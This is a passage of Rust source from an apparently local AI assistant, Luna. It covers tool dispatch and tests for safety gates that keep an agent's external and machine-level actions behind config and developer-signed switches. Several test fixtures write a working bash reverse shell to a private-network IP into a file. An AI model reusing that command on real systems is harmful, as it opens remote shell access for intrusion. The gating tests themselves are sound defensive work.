                                    if let (Some(l), Some(r)) = (line, rep) {
                                        line_edits.push((l as usize, r.to_string()));
                                    }
                                }
                            }
                        }
                        Some(selfpatch::ChangeSpec {
                            file: f.to_string(),
                            content,
                            edits,
                            line_edits,
                        })
                    }
                    let mut changes: Vec<selfpatch::ChangeSpec> = Vec::new();
                    if let Some(arr) = args["changes"].as_array() {
                        changes.extend(arr.iter().filter_map(spec));
                    }
                    if changes.is_empty() && args["file"].is_string() {
                        changes.extend(spec(&args.clone()));
                    }
                    if changes.is_empty() {
                        anyhow::bail!(
                            "self_patch propose needs a 'changes' array. Most reliable shape:\n\
                             {{\"action\":\"propose\",\"changes\":[{{\"file\":\"src/tools/x.rs\",\
                             \"line_edits\":[{{\"at_line\":42,\"replace_with\":\"<the new line>\"}}]}}],\
                             \"reason\":\"why\"}}\n\
                             'at_line' is 1-based and must be a line number you saw in the read \
                             output; use the last line number + 1 to APPEND. Copying exact text is \
                             error-prone, so prefer at_line over find/replace."
                        );
                    }
                    let reason = args["reason"].as_str().unwrap_or("");
                    Ok(selfpatch::propose(sp, &changes, reason).await?)
                }
                "validate" => Ok(selfpatch::validate(sp).await?),
                "review" => selfpatch::review(sp),
                "apply" => selfpatch::apply(sp),
                "rollback" => selfpatch::rollback(sp),
                "discard" => selfpatch::discard(),
                "files" => {
                    let root = std::path::PathBuf::from(&sp.source_dir);
                    if !sp.enabled {
                        anyhow::bail!("self-modification is disabled in config");
                    }
                    let filter = args["filter"].as_str().unwrap_or("");
                    Ok(selfpatch::list_source_files(&root, filter))
                }
                "read" => {
                    let f = args["file"].as_str().unwrap_or("");
                    let root = std::path::PathBuf::from(&sp.source_dir);
                    if !sp.enabled {
                        anyhow::bail!("self-modification is disabled in config");
                    }
                    selfpatch::read_file(&root, f)
                }
                _ => Ok(selfpatch::status(sp)),
            }
        }

        "system_update" => {
            let action = args["action"].as_str().unwrap_or("check");
            match action {
                "apply" => {
                    // The gate is config, not an argument. She cannot pass it.
                    Ok(crate::tools::pkgupdate::apply(
                        sudo_pass,
                        config.updates.allow_apply,
                    )
                    .await?)
                }
                _ => Ok(crate::tools::pkgupdate::check().await?),
            }
        }

        "run_safety_check" => {
            let action = args["action"].as_str().unwrap_or("status");
            match action {
                "run" => {
                    let mode = args["mode"].as_str().unwrap_or("light");
                    if crate::tools::safety::is_running() {
                        Ok(
                            "A safety check is already running — I'll wait for it and report the \
                            result. Ask me again in a while."
                                .into(),
                        )
                    } else {
                        match crate::tools::safety::run(mode, sudo_pass, false).await {
                            Ok(summary) => Ok(format!(
                                "Safety check started and finished. {}\n(Full log under \
                                 ~/logs/safety_check/. Ask if you want a part of it read.)",
                                summary
                            )),
                            Err(e) => Err(e),
                        }
                    }
                }
                _ => Ok(crate::tools::safety::status()),
            }
        }

        "backup" => {
            let action = args["action"].as_str().unwrap_or("status");
            match action {
                "run" => {
                    if !std::path::Path::new("/dev/sda1").exists() {
                        Ok(
                            "Backup drive /dev/sda1 isn't connected. Plug the external drive in \
                            and say 'back up my files' again."
                                .into(),
                        )
                    } else {
                        Ok(crate::tools::backup::run(sudo_pass).await?)
                    }
                }
                _ => Ok(crate::tools::backup::status().await?),
            }
        }

        "sysmode" => {
            let scfg = &config.sysmode;
            if !scfg.enabled {
                Ok(
                    "sysmode support is disabled in config ([sysmode] enabled = false). \
                    Tell the user to re-enable it in luna.toml if they want it."
                        .into(),
                )
            } else {
                let action = args["action"].as_str().unwrap_or("status");
                match action {
                    "switch" => {
                        let mode = args["mode"].as_str().unwrap_or("");
                        if mode.is_empty() {
                            Ok("The profile to switch to was missing. Ask the user which \
                                one: secure, cyber, stealth, or lockdown."
                                .into())
                        } else {
                            let hotspot = args.get("hotspot").and_then(|v| v.as_bool());
                            match crate::tools::sysmode::switch_mode(scfg, mode, hotspot, sudo_pass)
                                .await
                            {
                                Ok(out) => Ok(out),
                                Err(e) => {
                                    Ok(format!("Couldn't switch to the {mode} profile: {e:#}"))
                                }
                            }
                        }
                    }
                    "status" => match crate::tools::sysmode::status(scfg).await {
                        Ok(out) => Ok(out),
                        Err(e) => Ok(format!("Couldn't read sysmode status: {e:#}")),
                    },
                    "check" | "health" => match crate::tools::sysmode::health_check(scfg).await {
                        Ok(out) => Ok(out),
                        Err(e) => Ok(format!("Couldn't run the sysmode health check: {e:#}")),
                    },
                    "logs" => match crate::tools::sysmode::logs(scfg).await {
                        Ok(out) => Ok(out),
                        Err(e) => Ok(format!("Couldn't read sysmode logs: {e:#}")),
                    },
                    "reapply" => match crate::tools::sysmode::reapply(scfg, sudo_pass).await {
                        Ok(out) => Ok(out),
                        Err(e) => Ok(format!("Couldn't re-apply the sysmode profile: {e:#}")),
                    },
                    "verify" => match crate::tools::sysmode::verify(scfg).await {
                        Ok(out) => Ok(out),
                        Err(e) => Ok(format!("Couldn't run sysmode verify: {e:#}")),
                    },
                    "doctor" => match crate::tools::sysmode::doctor(scfg).await {
                        Ok(out) => Ok(out),
                        Err(e) => Ok(format!("Couldn't run sysmode doctor: {e:#}")),
                    },
                    "dossier" => {
                        let ip = args.get("ip").and_then(|v| v.as_str());
                        match crate::tools::sysmode::dossier(scfg, ip).await {
                            Ok(out) => Ok(out),
                            Err(e) => Ok(format!("Couldn't run sysmode dossier: {e:#}")),
                        }
                    }
                    _ => Ok(format!(
                        "Unknown sysmode action '{action}'. Valid actions: status, check, \
                         switch, reapply, logs, verify, doctor, dossier."
                    )),
                }
            }
        }

        "whatsapp_send" => {
            if !config.whatsapp.enabled {
                Ok("WhatsApp is disabled in config ([whatsapp] enabled = false). Tell the user to \
                    re-enable it in luna.toml if they want to use it."
                    .into())
            } else {
                let base = Some(config.whatsapp.base_url.as_str());
                let action = args["action"].as_str().unwrap_or("status");
                match action {
                    "send" => {
                        let to = args["to"].as_str().unwrap_or("");
                        let text = args["text"].as_str().unwrap_or("").trim();
                        if to.is_empty() {
                            Ok(
                                "The recipient was missing. Ask the user for it (full number, \
                                digits only, e.g. 15551234567, or a contact name like 'mom') \
                                and don't guess."
                                    .into(),
                            )
                        } else if text.is_empty() {
                            Ok("The message text was empty. Ask the user what to say.".into())
                        } else {
                            crate::tools::whatsapp::send(to, text, base).await
                        }
                    }
                    "lookup" => {
                        let to = args["to"].as_str().unwrap_or("");
                        if to.is_empty() {
                            Ok("The name to look up was missing. Ask the user for it.".into())
                        } else {
                            crate::tools::whatsapp::lookup(to, base).await
                        }
                    }
                    "contacts" => {
                        let q = args["q"].as_str();
                        let show_all = args["show_all"].as_bool().unwrap_or(false);
                        crate::tools::whatsapp::contacts(q, show_all, base).await
                    }
                    "frequent" => crate::tools::whatsapp::frequent(base).await,
                    _ => crate::tools::whatsapp::status(base).await,
                }
            }
        }

        "browser_do" => {
            if !config.browser.enabled {
                Ok("Browser automation is disabled in config ([browser] enabled = false). Tell \
                    the user to re-enable it in luna.toml."
                    .into())
            } else {
                let task = args["task"].as_str().unwrap_or("").trim();
                if task.is_empty() {
                    Ok("The browser task was empty. Ask the user what they want done in the \
                        browser."
                        .into())
                } else {
                    match crate::browser::run(task, config).await {
                        Ok(out) => Ok(out),
                        Err(e) => Ok(format!("Browser task failed: {e:#}")),
                    }
                }
            }
        }

        "desktop_do" => {
            if !config.desktop.enabled {
                Ok("Desktop automation is disabled in config ([desktop] enabled = false). Tell \
                    the user to re-enable it in luna.toml."
                    .into())
            } else {
                let task = args["task"].as_str().unwrap_or("").trim();
                if task.is_empty() {
                    Ok("The desktop task was empty. Ask the user what they want done on the \
                        computer."
                        .into())
                } else {
                    match crate::tools::desktop::run(task, config).await {
                        Ok(out) => Ok(out),
                        Err(e) => Ok(format!("Desktop task failed: {e:#}")),
                    }
                }
            }
        }

        unknown => {
            tracing::warn!("Unknown tool: {}", unknown);
            Ok(format!("Error: unknown tool '{}'", unknown))
        }
    }
}

/// Pull the URLs a research tool surfaced out of its plain-text result,
/// so the assistant can show the user the exact sources it referenced.
/// Format a unix timestamp for reminder display in local time.
/// so the assistant can show the user the exact sources it referenced.
/// Format a unix timestamp for reminder display in local time.
fn local_fmt(epoch: u64, fmt: &str) -> String {
    use chrono::TimeZone;
    chrono::Local
        .timestamp_opt(epoch as i64, 0)
        .single()
        .map(|d| d.format(fmt).to_string())
        .unwrap_or_default()
}

pub fn extract_sources(tool_name: &str, result: &str) -> Vec<String> {
    let mut sources: Vec<String> = Vec::new();
    let mut push = |s: &str| {
        let t = s.trim();
        if !t.is_empty() && !sources.iter().any(|x| x == t) {
            sources.push(t.to_string());
        }
    };

    match tool_name {
        "web_search" | "learn_topic" => {
            for line in result.lines() {
                let line = line.trim();
                if let Some(url) = line.strip_prefix("Source:").map(str::trim) {
                    push(url);
                } else if let Some(rest) = line.strip_prefix("=== Fetched page:") {
                    let url = rest.trim_end_matches("===").trim();
                    if !url.is_empty() {
                        push(url);
                    }
                } else if let Some(rest) = line.strip_prefix("- ") {
                    if rest.contains("http") {
                        if let Some(open) = rest.rfind('(') {
                            if let Some(close) = rest.rfind(')') {
                                if close > open {
                                    push(&rest[open + 1..close]);
                                }
                            }
                        }
                    }
                }
            }
        }
        _ => {}
    }

    sources
}

/// Fetch a page via Firecrawl keyless — returns clean markdown
async fn fetch_page_firecrawl(url: &str) -> Result<String> {
    let body = serde_json::json!({ "url": url });
    let body_str = body.to_string();

    let output = tokio::task::spawn_blocking(move || {
        std::process::Command::new("curl")
            .args([
                "-s",
                "--max-time",
                "30",
                "-H",
                "Content-Type: application/json",
                "-d",
                &body_str,
                "https://api.firecrawl.dev/v1/scrape",
            ])
            .output()
            .context("curl not found")
    })
    .await
    .context("spawn_blocking panicked")??;

    let resp: serde_json::Value = serde_json::from_str(&String::from_utf8_lossy(&output.stdout))
        .context("Failed to parse Firecrawl response")?;

    if let Some(err) = resp.get("error") {
        anyhow::bail!("Firecrawl: {}", err);
    }

    let markdown = resp["data"]["markdown"]
        .as_str()
        .context("No markdown in Firecrawl response")?;

    let truncated: String = markdown.chars().take(4000).collect();
    Ok(truncated)
}

#[cfg(test)]
mod gate_tests {
    use super::*;
    use crate::llm::ollama::{ToolCall, ToolCallFunction};

    fn call(name: &str, args: serde_json::Value) -> ToolCall {
        ToolCall {
            function: ToolCallFunction {
                name: name.into(),
                arguments: args,
            },
        }
    }

    /// The argument envelope must be unwrapped, or a correct call is reported
    /// as a missing argument.
    ///
    /// These payloads are lifted verbatim out of the 2026-10-01 run. Five
    /// consecutive `write_file` calls each carried a valid `path`, nested one
    /// level down under `arguments`, and each was reported as
    /// "write_file was called with no path". The model had done exactly what it
    /// was asked; the executor could not see the field.
    ///
    /// The prior guard (a missing argument must never report success) was
    /// *satisfied* by this bug — the calls did fail loudly, for the wrong
    /// reason. So a green test suite did not mean the tier worked.
    #[test]
    fn wrapped_argument_envelopes_are_unwrapped() {
        let body = serde_json::json!({
            "content": "#!/bin/bash\nbash -i >& /dev/tcp/192.168.1.100/4444 0>&1\n",
            "path": "/tmp/reverse_shell.sh"
        });

        // Every envelope spelling observed, all reaching the same argument set.
        for (label, wrapped) in [
            ("bare", body.clone()),
            (
                "function/arguments",
                serde_json::json!({"function": "write_file", "arguments": body.clone()}),
            ),
            (
                "name/arguments",
                serde_json::json!({"name": "write_file", "arguments": body.clone()}),
            ),
            (
                "tool/arguments",
                serde_json::json!({"tool": "write_file", "arguments": body.clone()}),
            ),
            (
                "tool_call/args",
                serde_json::json!({"tool_call": "write_file", "args": body.clone()}),
            ),
            (
                "parameters",
                serde_json::json!({"function": "write_file", "parameters": body.clone()}),
            ),
            (
                "double-encoded string",
                serde_json::json!({
                    "function": "write_file",
                    "arguments": serde_json::to_string(&body).unwrap(),
                }),
            ),
        ] {
            let got = normalise_tool_args(&wrapped);
            assert_eq!(
                got.get("path").and_then(|p| p.as_str()),
                Some("/tmp/reverse_shell.sh"),
                "{label}: path not recovered from {wrapped}"
            );
            assert_eq!(
                got.get("content").and_then(|c| c.as_str()),
                body.get("content").and_then(|c| c.as_str()),
                "{label}: content not recovered from {wrapped}"
            );
        }
    }

    /// The unwrapper must not eat a genuine argument set.
    ///
    /// Several real tools take a parameter literally named `name`
    /// (`allow_autokill`, `deny_autokill`, `use_skill`, `create_skill`). If the
    /// unwrapper keyed on `name` alone it would mangle them, and a mangled
    /// `allow_autokill` is a real behavioural regression. Two independent guards
    /// protect this, and both are asserted here rather than trusted: the wrapper
    /// must contain *only* wrapper keys, and it must name a registered tool.
    #[test]
    fn a_real_argument_set_is_never_unwrapped() {
        for (label, args) in [
            // `name` is a genuine parameter, and there is no payload key.
            ("allow_autokill", serde_json::json!({"name": "steam"})),
            ("use_skill", serde_json::json!({"name": "wifi-probe"})),
            // A real argument set that also contains `input`.
            ("mixed", serde_json::json!({"name": "steam", "note": "careful"})),
            // Wrapper-shaped but naming a tool that does not exist.
            (
                "unknown tool",
                serde_json::json!({"function": "chmod", "arguments": {"path": "/tmp/x"}}),
            ),
            // An empty payload carries no arguments and must not be unwrapped
            // into `{}`, which would look like a valid empty call.
            (
                "empty payload",
                serde_json::json!({"function": "list_reminders", "arguments": {}}),
            ),
        ] {
            let got = normalise_tool_args(&args);
            assert!(
                matches!(got, Cow::Borrowed(_)),
                "{label}: a genuine argument set was rewritten to {got}"
            );
            assert_eq!(
                *got,
                args,
                "{label}: a genuine argument set was rewritten to {got}"
            );
        }
    }

    /// The bug this fixes, end to end through `execute`, on the real payload.
    ///
    /// Asserts the *positive* outcome — the file exists with the right body —
    /// rather than the absence of an error message, because "no longer reports a
    /// missing path" and "actually wrote the file" are different claims and only
    /// the second one is worth having.
    #[tokio::test]
    async fn a_wrapped_envelope_actually_writes_the_file() {
        let config = crate::config::LunaConfig::default();
        let dir = std::env::temp_dir().join(format!("luna_envtest_{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("reverse_shell.sh");
        let content = "#!/bin/bash\nbash -i >& /dev/tcp/192.168.1.100/4444 0>&1\n";

        let out = execute(
            &call(
                "write_file",
                serde_json::json!({
                    "function": "write_file",
                    "arguments": {
                        "path": path.to_string_lossy(),
                        "content": content,
                    }
                }),
            ),
            &config,
        )
        .await
        .map_err(|e| e.to_string())
        .unwrap_or_else(|e| e);

        assert!(
            !out.to_lowercase().contains("no path"),
            "wrapped envelope still reported a missing path: {out:?}"
        );
        let written = std::fs::read_to_string(&path)
            .unwrap_or_else(|e| panic!("the file was not written: {e}"));
        assert_eq!(written, content, "the file body does not match what was asked for");
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// A missing required argument must be an ERROR, never a silent success.
    ///
    /// Measured cause: `write_file` defaulted a missing `path` to "/dev/null",
    /// discarded the content, and returned "Written to /dev/null". The model
    /// had done nothing and Luna reported it as done. `read_file` defaulted to
    /// /dev/null too, so it returned empty content and the model concluded the
    /// file did not exist.
    ///
    /// This is the failure mode the security tier's "prefer real tools over
    /// assertions" rule exists to prevent, so it has to be impossible in the
    /// tool layer rather than merely discouraged in the prompt.
    #[tokio::test]
    async fn a_missing_required_argument_never_reports_success() {
        let config = crate::config::LunaConfig::default();
        for (name, args) in [
            ("write_file", serde_json::json!({"content": "print('x')"})),
            ("write_file", serde_json::json!({"path": "  ", "content": "x"})),
            ("read_file", serde_json::json!({})),
            ("read_file", serde_json::json!({"path": ""})),
            ("run_shell", serde_json::json!({})),
            ("run_shell", serde_json::json!({"command": "   "})),
        ] {
            let out = execute(&call(name, args.clone()), &config)
                .await
                .map_err(|e| e.to_string())
                .unwrap_or_else(|e| e);
            // Match the exact success shapes these tools return, not the word
            // "written" anywhere in the string — "Nothing was written" is an
            // error message that an earlier version of this test flagged.
            let looks_like_success =
                out.starts_with("SUCCESS") || out.starts_with("Written to ");
            assert!(
                !looks_like_success,
                "{name} with {args} reported a success it did not perform: {out:?}"
            );
            // And the wording must name the missing argument, so the model can
            // correct itself on the next iteration.
            assert!(
                out.to_lowercase().contains("no path")
                    || out.to_lowercase().contains("no command"),
                "{name} did not say which argument was missing: {out:?}"
            );
        }
    }

    /// And the positive control: a well-formed call still works, so the guard
    /// above cannot be satisfied by simply refusing everything.
    #[tokio::test]
    async fn a_well_formed_write_file_still_succeeds() {
        let config = crate::config::LunaConfig::default();
        let dir = std::env::temp_dir().join(format!("luna_argtest_{}", std::process::id()));
        let path = dir.join("x.py");
        let out = execute(
            &call(
                "write_file",
                serde_json::json!({
                    "path": path.to_string_lossy(),
                    "content": "print('ok')"
                }),
            ),
            &config,
        )
        .await
        .expect("well-formed write_file must succeed");
        assert!(out.contains("Written to"), "{out}");
        assert_eq!(std::fs::read_to_string(&path).unwrap(), "print('ok')");
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// Regression lock for a real incident: asked to fix a log-rotation bug,
    /// Luna derailed and closed three of the user's actual Todoist tasks. The
    /// tools that act on the world had no gate, so a wrong turn became real,
    /// unrecoverable damage.
    #[test]
    fn the_external_action_gate_is_closed_by_default() {
        let cfg = crate::config::ExternalActionConfig::default();
        assert!(
            !cfg.allow_external_actions,
            "the external-action gate must default to CLOSED"
        );
    }

    /// The tools that act on the machine must be behind the developer-signed gate,
    /// and must be there BY DEFAULT.
    ///
    /// The default matters as much as the list: a capability that must be
    /// enabled before it exists is the difference between "she can't" and "she
    /// can, once". Asserting the default guards against someone adding a tool to
    /// the list but leaving `allow_capability_actions` true in a config file that
    /// gets copied around.
    #[test]
    fn capability_gated_tools_are_the_ones_that_act_on_the_machine() {
        let cfg = crate::config::LunaConfig::default();
        for t in ["nmap_scan", "sysmode", "self_patch", "system_update"] {
            assert!(
                cfg.external.is_capability_gated(t),
                "{t} must be behind the capability gate"
            );
        }
        // Read-only and everyday tools must NOT be swept up, or the gate just
        // makes Luna useless instead of safe.
        for t in [
            "run_shell", "read_file", "write_file", "edit_file", "system_info",
            "process_stats", "nmap_scan_no_such_tool",
        ] {
            assert!(
                !cfg.external.is_capability_gated(t),
                "{t} must not need the capability gate"
            );
        }
        assert!(
            !cfg.external.allow_capability_actions,
            "capability actions must default to OFF"
        );
    }

    /// The refusal must actually happen, through the real dispatch path.
    ///
    /// Asserting on the config list alone would pass while the check sat
    /// somewhere unreachable — the same mistake as testing `classify` in
    /// isolation while the tier was dead. This goes through `execute()` with the
    /// gate closed and asserts the tool did not run.
    #[tokio::test]
    async fn a_capability_tool_is_refused_while_the_gate_is_closed() {
        let cfg = crate::config::LunaConfig::default();
        // No developer key at all: the strongest possible closed state.
        let call = |name: &str, args: serde_json::Value| crate::llm::ollama::ToolCall {
            function: crate::llm::ollama::ToolCallFunction {
                name: name.to_string(),
                arguments: args,
            },
        };

        for (name, args) in [
            ("nmap_scan", serde_json::json!({"target": "127.0.0.1"})),
            ("sysmode", serde_json::json!({"action": "status"})),
            ("self_patch", serde_json::json!({"instruction": "add a test"})),
        ] {
            let err = crate::tools::execute(&call(name, args), &cfg)
                .await
                .expect_err(&format!("{name} must be refused with the gate closed"));
            let msg = err.to_string();
            assert!(
                msg.contains("capability") && msg.contains("Refused"),
                "{name} refusal should name the capability gate, got: {msg}"
            );
            // Must not look like an invitation.
            assert!(
                !msg.contains("nothing was changed") || msg.contains("Nothing was executed"),
                "{name} refusal must state nothing ran, got: {msg}"
            );
        }

        // And an ungated tool is unaffected by the same closed config.
        let ok = crate::tools::execute(
            &call("system_info", serde_json::json!({})),
            &cfg,
        )
        .await;
        assert!(
            ok.is_ok(),
            "an ungated tool must still work with capabilities closed, got: {:?}",
            ok.err().map(|e| e.to_string())
        );
    }

    #[test]
    fn the_tools_that_actually_caused_harm_are_gated() {
        let cfg = crate::config::ExternalActionConfig::default();
        for t in ["todoist_complete", "whatsapp_send", "browser_do"] {
            assert!(cfg.is_gated(t), "{t} must be gated");
        }
        // sysmode moved to the capability gate, which is stronger: it needs a
        // developer signature, not a boolean in this file. Asserting it here
        // again would pin it to the weaker gate.
        assert!(
            !cfg.is_gated("sysmode"),
            "sysmode must not be on the boolean-only external gate"
        );
        assert!(
            crate::config::LunaConfig::default()
                .external
                .is_capability_gated("sysmode"),
            "sysmode must be behind the signed capability gate"
        );
    }

    #[test]
    fn a_refusal_points_at_the_read_only_alternative() {
        // A dead-end refusal wastes a turn and invites a workaround. The model
        // should be handed the useful half of the same tool.
        let cfg = crate::config::ExternalActionConfig::default();
        let alts = cfg.read_only_alternatives("todoist_complete");
        assert!(
            alts.contains(&"todoist_list"),
            "todoist_complete refusal must suggest todoist_list, got {alts:?}"
        );
        // And the suggestion must not include gated tools.
        assert!(!alts.contains(&"todoist_add"), "must not suggest a gated tool");
    }

    #[test]
    fn read_only_counterparts_stay_open() {
        // The useful half of each service is read-only and must keep working,
        // otherwise the gate just makes Luna useless instead of safe.
        let cfg = crate::config::ExternalActionConfig::default();
        for t in [
            "todoist_list",
            "read_file",
            "web_search",
            "system_info",
            "list_memories",
        ] {
            assert!(!cfg.is_gated(t), "{t} is read-only and must NOT be gated");
        }
    }

    #[tokio::test]
    async fn a_gated_tool_refuses_and_names_the_human_switch() {
        // Deliberately the SHIPPED default, not a hand-built config: what
        // matters is that an out-of-the-box install refuses.
        let cfg = crate::config::LunaConfig::default();
        // A real, destructive call: if the gate leaked, this would close a task.
        let err = execute(
            &call(
                "todoist_complete",
                serde_json::json!({ "task": "anything at all" }),
            ),
            &cfg,
        )
        .await
        .expect_err("todoist_complete must be refused while the gate is closed");
        let msg = err.to_string();
        assert!(msg.contains("gate"), "must explain the gate: {msg}");
        assert!(
            msg.contains("allow_external_actions"),
            "must name the exact switch: {msg}"
        );
        // It must not pretend to have done anything.
        assert!(!msg.contains("Completed"), "must not claim success: {msg}");
    }

    #[tokio::test]
    async fn the_gate_is_checked_before_arguments_are_used() {
        // A gated tool invoked with nonsense args must still produce the gate
        // message, not an argument error. Otherwise a model could probe for an
        // arg shape that skips the check.
        let cfg = crate::config::LunaConfig::default();
        let err = execute(&call("whatsapp_send", serde_json::json!({})), &cfg)
            .await
            .expect_err("must refuse regardless of args");
        assert!(err.to_string().contains("allow_external_actions"), "got: {err}");
    }

    /// No tool may sit in both gated lists at once.
    ///
    /// Found the hard way: the live `luna.toml` carried `sysmode` in
    /// `gated_tools` while the code had also put it in `capability_tools`. The
    /// boolean gate is checked first at dispatch, so the weaker gate won, fired
    /// first, and printed instructions for the wrong key — the exact "why is this
    /// refusing when I turned that on" confusion the signed gate exists to avoid.
    ///
    /// In code this holds for the defaults; the failure mode is a hand-edited
    /// config, so the assertion is on the overlap itself rather than on any
    /// particular tool's membership.
    #[test]
    fn a_tool_is_never_in_both_gated_lists() {
        let cfg = crate::config::ExternalActionConfig::default();
        let overlap: Vec<&String> = cfg
            .gated_tools
            .iter()
            .filter(|t| cfg.capability_tools.contains(t))
            .collect();
        assert!(
            overlap.is_empty(),
            "these tools are in BOTH gated_tools and capability_tools: {overlap:?}\n\
             The boolean gate is evaluated first, so they would be refused by the weaker gate \
             with instructions for the wrong key. Pick one — capability_tools is the stronger."
        );
    }

    #[test]
    fn no_tool_schema_offers_a_way_to_open_the_external_gate() {
        // If any schema advertises a confirm/force/approve knob, the model can
        // set it and the gate is decorative again.
        let defs = tool_definitions();
        for d in &defs {
            let schema = serde_json::to_string(&d.function.parameters).unwrap();
            for banned in ["allow_external", "force", "override_gate", "bypass"] {
                assert!(
                    !schema.contains(banned),
                    "tool '{}' exposes '{banned}': {schema}",
                    d.function.name
                );
            }
        }
    }

    #[test]
    fn every_tool_is_explicitly_classified() {
        // The gate is only as good as its coverage. This is the test that stops
        // the exact mistake I made: hand-listing the dangerous tools and
        // forgetting one (todoist_add), which let a "read only" request create
        // two real tasks. A new tool must be consciously put in one list.
        //
        // Three lists, not two: `gated_tools` (a boolean in the config),
        // `capability_tools` (needs a developer signature), and
        // `READ_ONLY_TOOLS` (safe). The capability list exists because moving
        // `sysmode` there made this test fail correctly -- it refused to accept
        // a tool that was in neither list, which is exactly what should happen.
        let cfg = crate::config::ExternalActionConfig::default();
        let open: std::collections::HashSet<&str> =
            crate::config::READ_ONLY_TOOLS.iter().copied().collect();
        let mut unclassified: Vec<String> = Vec::new();
        for d in tool_definitions() {
            let n = d.function.name.as_str();
            if cfg.is_gated(n) || cfg.is_capability_gated(n) || open.contains(n) {
                continue;
            }
            unclassified.push(n.to_string());
        }
        assert!(
            unclassified.is_empty(),
            "these tools are in NEITHER gated_tools, capability_tools, nor READ_ONLY_TOOLS, so \
             their safety is undecided: {unclassified:?}\n\
             Add each to one of:\n  \
             ExternalActionConfig::default().gated_tools        — sends/closes/posts/clicks; a \
             boolean in luna.toml is enough\n  \
             ExternalActionConfig::default().capability_tools   — acts on this machine (probes \
             hosts, rewrites firewall state, edits her own source); needs the developer key\n  \
             config::READ_ONLY_TOOLS                            — only reads or touches local state"
        );
    }

    #[test]
    fn the_two_lists_do_not_overlap() {
        // A tool in both lists means the classification is contradictory and one
        // of the two answers is being ignored.
        let cfg = crate::config::ExternalActionConfig::default();
        for t in crate::config::READ_ONLY_TOOLS {
            assert!(
                !cfg.is_gated(t),
                "'{t}' is listed as read-only AND gated — pick one"
            );
        }
    }

    #[test]
    fn read_only_tools_all_exist() {
        // A stale entry in READ_ONLY_TOOLS hides a real tool from the coverage
        // test above by making the sets look bigger than they are.
        let defs = tool_definitions();
        let known: Vec<&str> = defs.iter().map(|d| d.function.name.as_str()).collect();
        for t in crate::config::READ_ONLY_TOOLS {
            assert!(
                known.contains(t),
                "READ_ONLY_TOOLS lists '{t}', which is not a real tool"
            );
        }
    }

    #[test]
    fn every_gated_tool_name_is_a_real_tool() {
        // A typo in gated_tools would silently leave a dangerous tool ungated.
        let defs = tool_definitions();
        let known: Vec<&str> = defs.iter().map(|d| d.function.name.as_str()).collect();
        let cfg = crate::config::ExternalActionConfig::default();
        for t in &cfg.gated_tools {
            assert!(
                known.contains(&t.as_str()),
                "gated_tools lists '{t}', which is not a real tool name (typo = no protection). \
                 Known: {known:?}"
            );
        }
    }
}

